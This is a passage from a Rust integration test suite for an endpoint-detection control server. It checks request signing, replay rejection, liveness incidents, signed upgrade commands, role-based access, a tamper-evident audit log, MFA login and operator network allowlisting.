    assert_eq!(rotations, 1, "a key rotation on an enrolled agent is recorded");
}

#[tokio::test]
async fn test_events_require_valid_signature_from_enrolled_agent() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "signed-agent").await;

    let body = agent.heartbeat();
    let (status, _) = post_agent(&app, "/api/events", body, None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let impostor = TestAgent::new("signed-agent");
    let body = agent.heartbeat();
    let (status, _) = send_signed(&app, &impostor, "/api/events", body).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let mut stranger = TestAgent::new("never-enrolled");
    let body = stranger.heartbeat();
    let (status, _) = send_signed(&app, &stranger, "/api/events", body).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let body = agent.heartbeat();
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
}

#[tokio::test]
async fn test_tampered_body_rejected() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "tampered-agent").await;

    let body = agent.heartbeat();
    let signature = agent.sign(&body);
    let tampered = body.replace("1640995200", "1640995201");
    let (status, _) = post_agent(&app, "/api/events", tampered, Some(&signature)).await;

    assert_eq!(status, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_replayed_request_rejected_and_opens_incident() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "replayed-agent").await;

    let body = agent.heartbeat();
    let signature = agent.sign(&body);
    let (status, _) = post_agent(&app, "/api/events", body.clone(), Some(&signature)).await;
    assert_eq!(status, StatusCode::OK);

    let (status, _) = post_agent(&app, "/api/events", body, Some(&signature)).await;
    assert_eq!(status, StatusCode::CONFLICT);
    assert_eq!(open_incidents(&pool, "replayed-agent").await, vec!["replay"]);
}

#[tokio::test]
async fn test_restart_starts_a_fresh_sequence_and_old_sessions_expire() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "restarting-agent").await;

    let body = agent.heartbeat();
    let stale_signature = agent.sign(&body);
    let stale_body = body.clone();
    let (status, _) = post_agent(&app, "/api/events", body, Some(&stale_signature)).await;
    assert_eq!(status, StatusCode::OK);

    for _ in 0..5 {
        agent.restart();
        let body = agent.heartbeat();
        let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
        assert_eq!(status, StatusCode::OK, "a restarted agent begins at seq 1 again");
    }

    let (status, _) = post_agent(&app, "/api/events", stale_body, Some(&stale_signature)).await;
    assert_eq!(status, StatusCode::CONFLICT, "requests from long-gone sessions are stale");

    let retained: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM agent_sessions WHERE agent_id = 'restarting-agent'")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert!(retained <= 4);
}

#[tokio::test]
async fn test_two_live_sessions_do_not_reject_each_other() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut service = enroll(&app, &pool, "upgrading-agent").await;

    let mut staging = TestAgent { id: service.id.clone(), key: service.key.clone(), session: service.session + 1, seq: 0 };

    for _ in 0..3 {
        let body = staging.heartbeat();
        let (status, _) = send_signed(&app, &staging, "/api/events", body).await;
        assert_eq!(status, StatusCode::OK);

        let body = service.heartbeat();
        let (status, _) = send_signed(&app, &service, "/api/events", body).await;
        assert_eq!(status, StatusCode::OK);
    }

    assert!(open_incidents(&pool, "upgrading-agent").await.is_empty());
}

#[tokio::test]
async fn test_service_stop_opens_incident_until_agent_returns() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "stopped-agent").await;

    let body = agent.batch(serde_json::json!([
        { "AgentStopping": { "timestamp": 1640995200, "reason": "ServiceStop" } }
    ]));
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(open_incidents(&pool, "stopped-agent").await, vec!["service_stopped"]);
    assert_eq!(liveness_state(&pool, "stopped-agent").await, "incident");

    agent.restart();
    let body = agent.heartbeat();
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
    assert!(open_incidents(&pool, "stopped-agent").await.is_empty());
    assert_eq!(liveness_state(&pool, "stopped-agent").await, "active");

    let history: Vec<String> = sqlx::query_scalar(
        "SELECT event_type FROM events WHERE agent_id = 'stopped-agent' AND event_type LIKE 'incident_%' ORDER BY rowid"
    )
    .fetch_all(&pool)
    .await
    .unwrap();
    assert_eq!(history, vec!["incident_opened", "incident_closed"]);
}

#[tokio::test]
async fn test_system_shutdown_is_not_an_incident() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "shutdown-agent").await;

    let body = agent.batch(serde_json::json!([
        { "AgentStopping": { "timestamp": 1640995200, "reason": "SystemShutdown" } }
    ]));
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);

    assert!(open_incidents(&pool, "shutdown-agent").await.is_empty());
    assert_eq!(liveness_state(&pool, "shutdown-agent").await, "stopped");

    let (events_tx, _) = tokio::sync::broadcast::channel(16);
    let far_future = chrono::Utc::now().timestamp() + 100_000;
    zedr_control_server::liveness::sweep_once(&pool, &events_tx, far_future, 0).await.unwrap();
    assert!(open_incidents(&pool, "shutdown-agent").await.is_empty());
    assert_eq!(liveness_state(&pool, "shutdown-agent").await, "stopped");
}

#[tokio::test]
async fn test_sweep_flags_only_the_uniquely_silent_agent() {
    let (app, pool) = create_test_app_with_pool().await;
    let _quiet = enroll(&app, &pool, "quiet-agent").await;
    let mut healthy = enroll(&app, &pool, "healthy-agent").await;
    let (events_tx, _) = tokio::sync::broadcast::channel(16);

    let now = chrono::Utc::now().timestamp();
    sqlx::query("UPDATE agents SET last_heartbeat = ? WHERE id = 'quiet-agent'")
        .bind(now - 1000)
        .execute(&pool)
        .await
        .unwrap();
    let body = healthy.heartbeat();
    send_signed(&app, &healthy, "/api/events", body).await;

    zedr_control_server::liveness::sweep_once(&pool, &events_tx, now, 0).await.unwrap();

    assert_eq!(open_incidents(&pool, "quiet-agent").await, vec!["silence"]);
    assert_eq!(liveness_state(&pool, "quiet-agent").await, "incident");
    assert!(open_incidents(&pool, "healthy-agent").await.is_empty());
    assert_eq!(liveness_state(&pool, "healthy-agent").await, "active");

    zedr_control_server::liveness::sweep_once(&pool, &events_tx, now + 15, 0).await.unwrap();
    let silence_incidents: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM incidents WHERE agent_id = 'quiet-agent'")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(silence_incidents, 1, "a continuing silence is one incident, not one per sweep");
}

#[tokio::test]
async fn test_sweep_holds_when_the_whole_fleet_is_silent() {
    let (app, pool) = create_test_app_with_pool().await;
    enroll(&app, &pool, "fleet-a").await;
    enroll(&app, &pool, "fleet-b").await;
    let (events_tx, _) = tokio::sync::broadcast::channel(16);

    let now = chrono::Utc::now().timestamp();
    sqlx::query("UPDATE agents SET last_heartbeat = ?").bind(now - 5000).execute(&pool).await.unwrap();

    zedr_control_server::liveness::sweep_once(&pool, &events_tx, now, 0).await.unwrap();

    for agent_id in ["fleet-a", "fleet-b"] {
        assert!(open_incidents(&pool, agent_id).await.is_empty());
        assert_eq!(liveness_state(&pool, agent_id).await, "suspect");
    }
}

#[tokio::test]
async fn test_sweep_does_not_alarm_for_silence_before_server_start() {
    let (app, pool) = create_test_app_with_pool().await;
    enroll(&app, &pool, "pre-restart-agent").await;
    let (events_tx, _) = tokio::sync::broadcast::channel(16);

    let now = chrono::Utc::now().timestamp();
    sqlx::query("UPDATE agents SET last_heartbeat = ?").bind(now - 50_000).execute(&pool).await.unwrap();

    zedr_control_server::liveness::sweep_once(&pool, &events_tx, now, now - 20).await.unwrap();

    assert!(open_incidents(&pool, "pre-restart-agent").await.is_empty());
    assert_eq!(liveness_state(&pool, "pre-restart-agent").await, "active");
}

#[tokio::test]
async fn test_heartbeat_closes_silence_incident() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "recovering-agent").await;
    let (events_tx, _) = tokio::sync::broadcast::channel(16);

    let now = chrono::Utc::now().timestamp();
    sqlx::query("UPDATE agents SET last_heartbeat = ?").bind(now - 2000).execute(&pool).await.unwrap();
    zedr_control_server::liveness::sweep_once(&pool, &events_tx, now, 0).await.unwrap();
    assert_eq!(open_incidents(&pool, "recovering-agent").await, vec!["silence"]);

    let body = agent.heartbeat();
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
    assert!(open_incidents(&pool, "recovering-agent").await.is_empty());
    assert_eq!(liveness_state(&pool, "recovering-agent").await, "active");
}

async fn handed_out(app: &axum::Router, agent: &mut TestAgent) -> Option<String> {
    let body = agent.heartbeat();
    let (status, json) = send_signed(app, agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
    json["upgrade"]["nonce"].as_str().map(str::to_string)
}

async fn let_time_pass_since_hand_out(pool: &SqlitePool, seconds: i64) {
    sqlx::query("UPDATE upgrade_commands SET handed_out_at = handed_out_at - ? WHERE handed_out_at IS NOT NULL")
        .bind(seconds)
        .execute(pool).await.unwrap();
}

#[tokio::test]
async fn test_pending_upgrade_is_handed_out_again_only_after_a_wait() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "upgrading-agent").await;
    let now = chrono::Utc::now().timestamp();
    sqlx::query(
        "INSERT INTO upgrade_commands (id, agent_id, target_version, status, created_at, signature, issued_at, nonce)
         VALUES ('upgrade-1', 'upgrading-agent', '0.2.0', 'pending', ?, x'00', ?, 'upgrade-nonce-1')"
    )
    .bind(now).bind(now)
    .execute(&pool).await.unwrap();

    assert_eq!(handed_out(&app, &mut agent).await, Some("upgrade-nonce-1".to_string()));
    assert_eq!(handed_out(&app, &mut agent).await, None, "the same command is not handed out with the next heartbeat");

    let_time_pass_since_hand_out(&pool, 118).await;
    assert_eq!(handed_out(&app, &mut agent).await, None, "two minutes have not passed");

    let_time_pass_since_hand_out(&pool, 2).await;
    assert_eq!(handed_out(&app, &mut agent).await, Some("upgrade-nonce-1".to_string()), "the answer to the first hand-out may have been lost");
    assert_eq!(handed_out(&app, &mut agent).await, None, "the wait starts again");

    let refused = serde_json::json!([{
        "Upgrade": {
            "timestamp": 1640995200, "from_version": "0.1.0", "to_version": "0.2.0",
            "status": "Failed", "error": "The Linux agent does not upgrade itself, run the installer again"
        }
    }]);
    let body = agent.batch(refused);
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);

    let_time_pass_since_hand_out(&pool, 120).await;
    assert_eq!(handed_out(&app, &mut agent).await, None, "a command with an answer is not handed out again");
}

#[tokio::test]
async fn test_delivered_upgrade_command_is_signed_for_its_agent() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "commanded-agent").await;
    insert_install_key(&pool, "zedr_upgrade_key", 3600).await;

    let (status, _) = call(
        &app,
        "POST",
        "/api/admin/upgrades",
        Some(&admin_token("admin")),
        Some(serde_json::json!({ "agent_id": "commanded-agent", "install_key_id": "id-zedr_upgrade_key", "target_version": "0.2.0" })),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED);

    let body = agent.heartbeat();
    let (status, json) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);

    let command = &json["upgrade"];
    assert_eq!(command["agent_id"], "commanded-agent");
    assert_eq!(command["target_version"], "0.2.0");

    let signature_bytes: Vec<u8> = command["signature"].as_array().unwrap().iter().map(|b| b.as_u64().unwrap() as u8).collect();
    let signature = ed25519_dalek::Signature::from_slice(&signature_bytes).unwrap();
    let seed: [u8; 32] = hex::decode(TEST_SIGNING_KEY_HEX).unwrap().try_into().unwrap();
    let server_key = SigningKey::from_bytes(&seed).verifying_key();

    let signed_for = |agent_id: &str| zedr_protocol::upgrade_command_signing_bytes(
        agent_id,
        command["target_version"].as_str().unwrap(),
        command["nonce"].as_str().unwrap(),
        command["issued_at"].as_u64().unwrap(),
    ).unwrap();

    assert!(server_key.verify(&signed_for("commanded-agent"), &signature).is_ok());
    assert!(server_key.verify(&signed_for("some-other-agent"), &signature).is_err());
}

#[tokio::test]
async fn test_install_key_list_shows_which_agent_enrolled_with_it() {
    let (app, pool) = create_test_app_with_pool().await;
    let token = admin_token("admin");
    enroll(&app, &pool, "listed-agent").await;
    insert_install_key(&pool, "zedr_never_used", 3600).await;

    let (status, json) = call(&app, "GET", "/api/admin/installers", Some(&token), None).await;
    assert_eq!(status, StatusCode::OK);

    let keys = json["keys"].as_array().unwrap();
    let enrolled = keys.iter().find(|key| key["enrolled_agent_id"] == "listed-agent").expect("enrolled key is listed");
    assert!(enrolled["enrolled_at"].as_i64().unwrap() > 0);

    let unused = keys.iter().find(|key| key["id"] == "id-zedr_never_used").unwrap();
    assert!(unused["enrolled_at"].is_null());
    assert!(unused["enrolled_agent_id"].is_null());
}

#[tokio::test]
async fn test_install_keys_are_never_stored_in_plaintext() {
    let (app, pool) = create_test_app_with_pool().await;
    let token = admin_token("admin");

    let response = app.clone().oneshot(
        Request::builder().method("POST").uri("/api/admin/installers/generate")
            .header("content-type", "application/json")
            .header("authorization", format!("Bearer {}", token))
            .body(Body::from("{}")).unwrap(),
    ).await.unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    let generated: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
    let plaintext = generated["install_key"].as_str().unwrap();

    let columns: Vec<String> = sqlx::query_scalar("SELECT name FROM pragma_table_info('install_keys')")
        .fetch_all(&pool).await.unwrap();
    assert!(!columns.contains(&"key_plaintext".to_string()));

    let dump: Vec<String> = sqlx::query_scalar(
        "SELECT id || key_hash || created_by || agent_version FROM install_keys"
    ).fetch_all(&pool).await.unwrap();
    assert!(dump.iter().all(|row| !row.contains(plaintext)));
}

#[tokio::test]
async fn test_incidents_endpoint_requires_auth_and_lists_incidents() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "listed-agent").await;
    let body = agent.batch(serde_json::json!([
        { "AgentStopping": { "timestamp": 1640995200, "reason": "ServiceStop" } }
    ]));
    send_signed(&app, &agent, "/api/events", body).await;

    let response = app.clone().oneshot(
        Request::builder().uri("/api/admin/incidents?open=true").body(Body::empty()).unwrap(),
    ).await.unwrap();
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED);

    let response = app.clone().oneshot(
        Request::builder().uri("/api/admin/incidents?open=true")
            .header("authorization", format!("Bearer {}", admin_token("admin")))
            .body(Body::empty()).unwrap(),
    ).await.unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    let incidents: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
    assert_eq!(incidents.as_array().unwrap().len(), 1);
    assert_eq!(incidents[0]["incident_type"], "service_stopped");
    assert_eq!(incidents[0]["agent_id"], "listed-agent");
}

async fn call(
    app: &axum::Router,
    method: &str,
    uri: &str,
    token: Option<&str>,
    body: Option<serde_json::Value>,
) -> (StatusCode, serde_json::Value) {
    let mut request = Request::builder().method(method).uri(uri);
    if let Some(token) = token {
        request = request.header("authorization", format!("Bearer {}", token));
    }
    let request = match body {
        Some(body) => request
            .header("content-type", "application/json")
            .body(Body::from(body.to_string()))
            .unwrap(),
        None => request.body(Body::empty()).unwrap(),
    };

    let response = app.clone().oneshot(request).await.unwrap();
    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    (status, serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null))
}

async fn insert_user(pool: &SqlitePool, id: &str, username: &str, password: &str, role: &str) {
    sqlx::query("INSERT INTO users (id, username, password_hash, role, created_at) VALUES (?, ?, ?, ?, ?)")
        .bind(id)
        .bind(username)
        .bind(zedr_control_server::auth::hash_password(password).unwrap())
        .bind(role)
        .bind(chrono::Utc::now().timestamp())
        .execute(pool)
        .await
        .unwrap();
}

fn totp_step_now() -> u64 {
    chrono::Utc::now().timestamp() as u64 / 30
}

#[tokio::test]
async fn test_user_role_is_read_only() {
    let (app, pool) = create_test_app_with_pool().await;
    enroll(&app, &pool, "rbac-agent").await;
    let user = admin_token("user");

    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&user), None).await;
    assert_eq!(status, StatusCode::OK);
    let (status, _) = call(&app, "GET", "/api/admin/incidents", Some(&user), None).await;
    assert_eq!(status, StatusCode::OK);

    let forbidden = [
        ("POST", "/api/admin/installers/generate", Some(serde_json::json!({}))),
        ("POST", "/api/admin/upgrades", Some(serde_json::json!({ "agent_id": "rbac-agent", "install_key_id": "k", "target_version": "0.2.0" }))),
        ("GET", "/api/admin/users", None),
        ("POST", "/api/admin/users", Some(serde_json::json!({ "username": "x", "password": "Str0ng!Passw0rd", "role": "admin" }))),
        ("DELETE", "/api/admin/users/any", None),
        ("GET", "/api/admin/audit", None),
    ];

    for (method, uri, body) in forbidden {
        let (status, _) = call(&app, method, uri, Some(&user), body).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{} {} must need the admin role", method, uri);
    }

    let created: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM users WHERE username = 'x'").fetch_one(&pool).await.unwrap();
    assert_eq!(created, 0);
}

#[tokio::test]
async fn test_admin_actions_are_audited_in_a_verifiable_chain() {
    let (app, pool) = create_test_app_with_pool().await;
    enroll(&app, &pool, "audited-agent").await;
    let admin = admin_token("admin");

    let (_, install_key) = call(&app, "POST", "/api/admin/installers/generate", Some(&admin), Some(serde_json::json!({}))).await;
    let (_, api_key) = call(&app, "POST", "/api/admin/api-keys", Some(&admin), Some(serde_json::json!({ "name": "ci" }))).await;
    call(&app, "POST", "/api/admin/upgrades", Some(&admin), Some(serde_json::json!({ "agent_id": "audited-agent", "install_key_id": install_key["id"], "target_version": "0.2.0" }))).await;
    call(&app, "DELETE", &format!("/api/admin/api-keys/{}", api_key["id"].as_str().unwrap()), Some(&admin), None).await;

    let (status, audit) = call(&app, "GET", "/api/admin/audit", Some(&admin), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(audit["chain_intact"], true);

    let actions: Vec<&str> = audit["entries"].as_array().unwrap().iter().map(|e| e["action"].as_str().unwrap()).collect();
    assert_eq!(actions, vec!["api_key.revoke", "upgrade.issue", "api_key.create", "install_key.generate"]);
    assert!(audit["entries"].as_array().unwrap().iter().all(|e| e["actor"] == "tester"));
    assert!(audit["entries"][1]["detail"].as_str().unwrap().contains("0.2.0"));

    sqlx::query("UPDATE audit_log SET detail = '{\"target_version\":\"0.1.0\"}' WHERE action = 'upgrade.issue'")
        .execute(&pool)
        .await
        .unwrap();
    let (_, audit) = call(&app, "GET", "/api/admin/audit", Some(&admin), None).await;
    assert_eq!(audit["chain_intact"], false);
    assert_eq!(audit["first_broken_seq"], 3);
}

#[tokio::test]
async fn test_deleting_an_audit_row_breaks_the_chain() {
    let (app, pool) = create_test_app_with_pool().await;
    let admin = admin_token("admin");

    for _ in 0..3 {
        call(&app, "POST", "/api/admin/installers/generate", Some(&admin), Some(serde_json::json!({}))).await;
    }
    sqlx::query("DELETE FROM audit_log WHERE seq = 2").execute(&pool).await.unwrap();

    let (_, audit) = call(&app, "GET", "/api/admin/audit", Some(&admin), None).await;
    assert_eq!(audit["chain_intact"], false);
    assert_eq!(audit["first_broken_seq"], 3);
}

#[tokio::test]
async fn test_logins_are_audited() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-login", "operator", "Correct-Horse-9", "admin").await;

    let (status, _) = call(&app, "POST", "/api/auth/login", None, Some(serde_json::json!({ "username": "operator", "password": "wrong" }))).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = call(&app, "POST", "/api/auth/login", None, Some(serde_json::json!({ "username": "nobody", "password": "wrong" }))).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, login) = call(&app, "POST", "/api/auth/login", None, Some(serde_json::json!({ "username": "operator", "password": "Correct-Horse-9" }))).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(login["mfa_required"], false);
    assert!(login["token"].is_string());

    let actions: Vec<(String, String)> = sqlx::query_as("SELECT actor, action FROM audit_log ORDER BY seq")
        .fetch_all(&pool)
        .await
        .unwrap();
    assert_eq!(actions, vec![
        ("operator".to_string(), "login.failed".to_string()),
        ("nobody".to_string(), "login.failed".to_string()),
        ("operator".to_string(), "login".to_string()),
    ]);
}

#[tokio::test]
async fn test_mfa_enrolment_and_second_factor_login() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-mfa", "analyst", "Correct-Horse-9", "admin").await;
    let credentials = serde_json::json!({ "username": "analyst", "password": "Correct-Horse-9" });

    let (_, login) = call(&app, "POST", "/api/auth/login", None, Some(credentials.clone())).await;
    let token = login["token"].as_str().unwrap().to_string();

    let (status, setup) = call(&app, "POST", "/api/auth/mfa/setup", Some(&token), None).await;
    assert_eq!(status, StatusCode::OK);
    assert!(setup["provisioning_uri"].as_str().unwrap().starts_with("otpauth://totp/zedr:analyst?secret="));

    let secret_hex: String = sqlx::query_scalar("SELECT mfa_secret FROM users WHERE id = 'u-mfa'").fetch_one(&pool).await.unwrap();
    let secret = hex::decode(secret_hex).unwrap();
    assert_eq!(setup["secret"], zedr_control_server::mfa::base32_encode(&secret));

    let (status, _) = call(&app, "POST", "/api/auth/mfa/enable", Some(&token), Some(serde_json::json!({ "code": "000000" }))).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (_, still_single) = call(&app, "POST", "/api/auth/login", None, Some(credentials.clone())).await;
    assert_eq!(still_single["mfa_required"], false, "a pending setup must not lock the account");

    let enable_code = zedr_control_server::mfa::code_at_step(&secret, totp_step_now());
    let (status, enabled) = call(&app, "POST", "/api/auth/mfa/enable", Some(&token), Some(serde_json::json!({ "code": enable_code }))).await;
    assert_eq!(status, StatusCode::OK);
    let recovery_codes: Vec<String> = enabled["recovery_codes"].as_array().unwrap().iter().map(|c| c.as_str().unwrap().to_string()).collect();
    assert_eq!(recovery_codes.len(), 10);

    let (status, challenge) = call(&app, "POST", "/api/auth/login", None, Some(credentials.clone())).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(challenge["mfa_required"], true);
    assert!(challenge["token"].is_null(), "no access token before the second factor");
    let mfa_token = challenge["mfa_token"].as_str().unwrap().to_string();

    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&mfa_token), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "a challenge token is not an access token");

    let (status, _) = call(&app, "POST", "/api/auth/login/mfa", None, Some(serde_json::json!({ "mfa_token": mfa_token, "code": enable_code }))).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "a code that was already used is rejected");

    let (status, _) = call(&app, "POST", "/api/auth/login/mfa", None, Some(serde_json::json!({ "mfa_token": token, "code": "123456" }))).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "an access token is not a challenge token");

    let fresh_code = zedr_control_server::mfa::code_at_step(&secret, totp_step_now() + 1);
    let (status, session) = call(&app, "POST", "/api/auth/login/mfa", None, Some(serde_json::json!({ "mfa_token": mfa_token, "code": fresh_code }))).await;
    assert_eq!(status, StatusCode::OK);
    let access = session["token"].as_str().unwrap().to_string();
    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&access), None).await;
    assert_eq!(status, StatusCode::OK);

    let (_, challenge) = call(&app, "POST", "/api/auth/login", None, Some(credentials.clone())).await;
    let mfa_token = challenge["mfa_token"].as_str().unwrap().to_string();
    let recovery = serde_json::json!({ "mfa_token": mfa_token, "code": recovery_codes[0] });
    let (status, _) = call(&app, "POST", "/api/auth/login/mfa", None, Some(recovery.clone())).await;
    assert_eq!(status, StatusCode::OK);
    let (status, _) = call(&app, "POST", "/api/auth/login/mfa", None, Some(recovery)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "a recovery code works once");

    let (status, _) = call(&app, "POST", "/api/auth/mfa/disable", Some(&access), Some(serde_json::json!({ "code": recovery_codes[1] }))).await;
    assert_eq!(status, StatusCode::OK);
    let (_, login) = call(&app, "POST", "/api/auth/login", None, Some(credentials)).await;
    assert_eq!(login["mfa_required"], false);

    let stored_plain: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM mfa_recovery_codes WHERE code_hash = ?")
        .bind(&recovery_codes[2])
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(stored_plain, 0, "recovery codes are stored hashed");
}

#[tokio::test]
async fn test_user_management_rules() {
    let app = create_test_app().await;
    let admin = admin_token("admin");

    let weak = serde_json::json!({ "username": "weak", "password": "short", "role": "user" });
    let (status, _) = call(&app, "POST", "/api/admin/users", Some(&admin), Some(weak)).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);

    let bad_role = serde_json::json!({ "username": "odd", "password": "Str0ng!Passw0rd", "role": "superuser" });
    let (status, _) = call(&app, "POST", "/api/admin/users", Some(&admin), Some(bad_role)).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);

    let viewer = serde_json::json!({ "username": "viewer", "password": "Str0ng!Passw0rd", "role": "user" });
    let (status, created) = call(&app, "POST", "/api/admin/users", Some(&admin), Some(viewer.clone())).await;
    assert_eq!(status, StatusCode::CREATED);
    let viewer_id = created["id"].as_str().unwrap().to_string();

    let (status, _) = call(&app, "POST", "/api/admin/users", Some(&admin), Some(viewer)).await;
    assert_eq!(status, StatusCode::CONFLICT);

    let (_, login) = call(&app, "POST", "/api/auth/login", None, Some(serde_json::json!({ "username": "viewer", "password": "Str0ng!Passw0rd" }))).await;
    assert_eq!(login["role"], "user");
    let viewer_token = login["token"].as_str().unwrap().to_string();
    let (status, _) = call(&app, "GET", "/api/admin/users", Some(&viewer_token), None).await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    let (status, _) = call(&app, "DELETE", "/api/admin/users/user-1", Some(&admin), None).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "an admin cannot delete their own account");

    let ghost = zedr_control_server::auth::create_jwt("ghost", "ghost", "admin", 0, TEST_JWT_SECRET).unwrap();
    let (status, _) = call(&app, "DELETE", "/api/admin/users/user-1", Some(&ghost), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "a signed token for an account that does not exist is refused");

    let (status, _) = call(&app, "DELETE", &format!("/api/admin/users/{}", viewer_id), Some(&admin), None).await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    let (status, users) = call(&app, "GET", "/api/admin/users", Some(&admin), None).await;
    assert_eq!(status, StatusCode::OK);
    let names: Vec<&str> = users.as_array().unwrap().iter().map(|user| user["username"].as_str().unwrap()).collect();
    assert_eq!(names, vec!["tester", "reader"]);
}

#[tokio::test]
async fn test_liveness_and_readiness_probes() {
    let (app, pool) = create_test_app_with_pool().await;

    let (status, _) = call(&app, "GET", "/healthz", None, None).await;
    assert_eq!(status, StatusCode::OK);
    let (status, _) = call(&app, "GET", "/readyz", None, None).await;
    assert_eq!(status, StatusCode::OK);

    pool.close().await;
    let (status, _) = call(&app, "GET", "/healthz", None, None).await;
    assert_eq!(status, StatusCode::OK, "liveness has no dependencies");
    let (status, _) = call(&app, "GET", "/readyz", None, None).await;
    assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE, "readiness fails when the database is unreachable");
}

fn app_with_allowlist(pool: SqlitePool, allowlist: &str, peer: Option<&str>) -> axum::Router {
    set_test_env();
    let options = zedr_control_server::api::RouterOptions {
        operator_allowlist: zedr_control_server::api::middleware::parse_operator_allowlist(allowlist).unwrap(),
        frontend_dist: None,
        receipt_verifier: None,
    };
    let app = zedr_control_server::api::create_router_with_options(pool, options);
    match peer {
        Some(peer) => {
            let address: std::net::SocketAddr = format!("{}:50000", peer).parse().unwrap();
            app.layer(axum::extract::connect_info::MockConnectInfo(address))
        }
        None => app,
    }
}

#[tokio::test]
async fn test_operator_surface_is_limited_to_allowed_networks() {
    let pool = create_test_db().await;
    let admin = admin_token("admin");

    let inside = app_with_allowlist(pool.clone(), "203.0.113.0/24", Some("203.0.113.10"));
    let (status, _) = call(&inside, "GET", "/api/admin/agents", Some(&admin), None).await;
    assert_eq!(status, StatusCode::OK);

    let outside = app_with_allowlist(pool.clone(), "203.0.113.0/24", Some("198.51.100.20"));
    let (status, _) = call(&outside, "GET", "/api/admin/agents", Some(&admin), None).await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    let (status, _) = call(&outside, "POST", "/api/auth/login", None, Some(serde_json::json!({ "username": "a", "password": "b" }))).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "login is operator surface too");
    let (status, _) = call(&outside, "GET", "/api-docs/openapi.json", None, None).await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    let unknown_peer = app_with_allowlist(pool, "203.0.113.0/24", None);
    let (status, _) = call(&unknown_peer, "GET", "/api/admin/agents", Some(&admin), None).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "an unknown peer address is denied");
}

#[tokio::test]
async fn test_agents_reach_the_server_from_outside_the_allowlist() {
    let pool = create_test_db().await;
    let outside = app_with_allowlist(pool.clone(), "203.0.113.0/24", Some("198.51.100.20"));

    let (status, _) = call(&outside, "GET", "/healthz", None, None).await;
    assert_eq!(status, StatusCode::OK);

    let agent = enroll(&outside, &pool, "remote-agent").await;
    let mut agent = agent;
    let body = agent.heartbeat();
    let (status, _) = send_signed(&outside, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);

    let ledger = TestLedger::of(&agent);
    let mut remote = Endpoint { agent, ledger };
    remote.deliver(&outside, &[quiet(1)]).await;
